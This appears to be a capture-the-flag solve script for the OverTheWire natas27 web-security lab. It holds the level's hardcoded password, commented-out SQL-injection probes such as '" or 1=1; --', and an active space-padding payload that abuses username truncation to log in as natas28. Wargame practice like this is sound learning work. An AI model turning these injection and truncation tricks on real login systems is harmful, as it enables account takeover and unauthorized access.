#!bin/python3
import requests

session = requests.Session()

url = "http://natas27.natas.labs.overthewire.org/"
auth_username = "natas27"
auth_password = "55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ"

'''
r = session.get(url,auth=(auth_username,auth_password))
print(r.text)
print(r.cookies)
'''
'''
initialResponse = session.post(url,auth=(auth_username,auth_password),data={'username':' hmm','password':'lol'})
print(initialResponse.text)
normalResponse = session.post(url,auth=(auth_username,auth_password),data={'username':' hmm a','password':'lol'})
normalLength = len(normalResponse.text)
print(f"This is normal: {normalLength}")

specialChars = ['\'','"','#','-','*','=','(',')',' ']

for char in specialChars:
    response = session.post(url,auth=(auth_username,auth_password),data={'username':' hmm' + ' ' + char,'password':'lol'})

    newlength = len(response.text)
    if(newlength != normalLength):
        print(response.text)
        print(f"not normal: {newlength}")
'''
'''
r = session.post(url,auth=(auth_username,auth_password),data={'username':'natas27 " or 1=1; --','password':'lol" or 1=1; # '})
print(r.text)
'''
payload = ' '*64 + 'a'

r = session.post(url,auth=(auth_username,auth_password),data={'username':'natas28'+f'{payload}','password':'lol'})
print(r.text)
r = session.post(url,auth=(auth_username,auth_password),data={'username':'natas28','password':'lol'})
print(r.text)